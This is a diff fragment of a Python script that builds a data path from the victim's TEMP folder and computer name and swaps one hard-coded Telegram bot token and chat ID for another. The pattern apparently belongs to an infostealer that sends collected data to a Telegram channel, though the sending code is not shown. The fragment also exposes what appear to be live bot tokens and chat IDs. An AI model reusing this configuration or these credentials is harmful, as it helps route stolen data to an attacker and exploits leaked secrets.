@@ -31,9 +31,9 @@ TMP = os.getenv("TEMP")
 USR = TMP.split("\\AppData")[0] if TMP else os.path.expanduser('~')
 data_path = f"{TMP}\\{os.getenv('COMPUTERNAME', 'defaultValue')}"
 
-TOKEN_BOT = "8161467078:AAFHIdqQ0AZTppCPBuwWymwKECEqewCzTgM"
+TOKEN_BOT = "7270761070:AAFsOTLX5no2ZUYy61ACwLYNEuxlezEYjUU"
 
-CHAT_ID = "-1002652544080"
+CHAT_ID = "-4760975612"
 
 creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')
 
